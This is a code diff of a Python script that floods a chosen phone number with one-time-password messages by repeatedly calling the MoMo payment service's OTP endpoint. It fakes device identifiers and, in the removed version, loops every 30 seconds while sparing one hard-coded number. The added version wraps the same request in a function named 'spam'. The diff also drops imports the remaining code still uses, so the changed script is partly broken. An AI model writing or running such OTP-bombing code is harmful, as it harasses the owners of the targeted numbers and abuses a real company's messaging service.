@@ -1,14 +1,3 @@
-from typing import Optional
-from fastapi import FastAPI
-import random
-import json
-import urllib.request
-import urllib
-import uuid
-import requests
-import hmac
-import hashlib, random ,time
-from time import sleep
 def generateRandomString(length = 20) :
     characters = '0123456789abcdef'
     charactersLength = len(characters)
@@ -20,13 +9,8 @@ def generateRandomString(length = 20) :
     return randomString
 def generateImei() :
         return str(str(str(str(str(str(str(str(generateRandomString(8)) + '-') + str(generateRandomString(4))) + '-') + str(generateRandomString(4))) + '-') + str(generateRandomString(4))) + '-') + str(generateRandomString(12));  
-generateImei()
-sdt=input('Enter Momo : ')
-if sdt=='0328774559':
-    exit('spam cc')
-url="https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG"
-while True:
- time=random.randint(1000000000000,1999999999999)
+def spam(sdt):
+ url="https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG"
  data={
   "user":sdt,
   "msgType": "SEND_OTP_MSG",
@@ -73,14 +57,10 @@ while True:
   
  }
  }
-
  h={
 'Host':'api.momo.vn',
 'msgtype':'SEND_OTP_MSG',
-
 'user-agent':'okhttp/4.9.0',}
  data = json.dumps(data)
- t=requests.post("https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG",headers=h,data=data)
- print(t.text)
- print('-'*50)
- sleep(30)
+ json=requests.post(url,headers=h,data=data).text
+ print(json)
